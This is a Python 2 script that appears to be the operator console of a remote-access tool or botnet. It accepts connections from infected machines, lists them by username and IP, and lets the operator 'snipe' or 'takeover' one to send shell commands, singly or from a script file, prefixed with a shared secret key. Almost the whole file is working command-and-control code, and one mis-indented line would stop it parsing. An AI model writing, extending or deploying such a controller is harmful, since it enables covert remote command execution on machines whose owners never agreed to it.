#!/usr/bin/env python
import socket
import threading
import sys
import os

HOST,PORT = "0.0.0.0", 9529
all_connections = []
code = "HACSFWEPFOWEJFPO"

class bcolors:
	HEADER = '\033[95m'
	OKBLUE = '\033[94m'
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'
	BOLD = '\033[1m'
	UNDERLINE = '\033[4m'

class Connection:
	def __init__(self, ip, client, username):
		self.ip = ip
		self.client = client
		self.username = username

	def __str__(self):
		return (self.username + '@' + self.ip)

def print_help():
	print("[Commands]")
	print("list - Lists all connected machines")
	print("snipe [list_index] - connects to specified machine")
    print("script [filepath] - sends line by line commands from a file")
	print("exit - Leaves connected machine")

def listen_thread():
	global all_connections
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	s.bind((HOST, PORT))
	s.listen(5)
	while True:
		client, addr = s.accept()
		username = client.recv(24)
		print(bcolors.OKGREEN + ("Received %s from %s" % (username, addr)) + bcolors.ENDC)
		new_connection = Connection(addr[0], client, username)
		all_connections.append(new_connection)
	
if __name__ == "__main__":
	t = threading.Thread(target=listen_thread, args = ())
	t.daemon = True
	t.start()
	scope = "Master"
	current_target = None
	target_index = -1
	while True:
		input_line = bcolors.OKBLUE + scope + bcolors.ENDC + ">"
		command = raw_input(input_line)
		split = command.split(" ")
		if command == "list":
			if len(all_connections) == 0:
				print("No machines connected")
			for i in range(0, len(all_connections)):
				connection = all_connections[i]
				print("[%d] %s@%s" % (i, connection.username, connection.ip))
		elif (split[0] == "takeover" or split[0] == "snipe") and len(split) == 2:
			target = -1
			try:
				target = int(split[1])
			except ValueError:
				print("Not a valid number")
			if target > -1 and target < len(all_connections):
				print("Opened connection to %s" % all_connections[target])
				current_target = all_connections[target]
				target_index = target
				scope = current_target.ip 
		elif command == "exit":
			if current_target is None:
				print("Not connected to any particular machine")
			else:
				current_target = None
				scope = "Master"
		elif split[0] == 'script' and len(split) == 2 and current_target is not None:
			if not os.path.isfile(split[1]):
				print("Not a valid script file")
			else:
				with open(split[1], 'r') as f:
					for line in f.readlines():
						li = line.strip()
						try:
							current_target.client.send(code + li)
							result = current_target.client.recv(1024)
							print(result)
						except socket.error:
							all_connections.pop(target_index)
							print("Error: No connection")
							target_index = -1
							scope = "Master"
							current_target = None
		else:
			if current_target is None:
				print("Not connected to any target")
				print_help()
			else:
				try:
					current_target.client.send(code + command)
					result = current_target.client.recv(1024)
					print(result)
				except socket.error:
					all_connections.pop(target_index)
					print("Error: No connection")
					target_index = -1
					scope = "Master"
					current_target = None
				

	
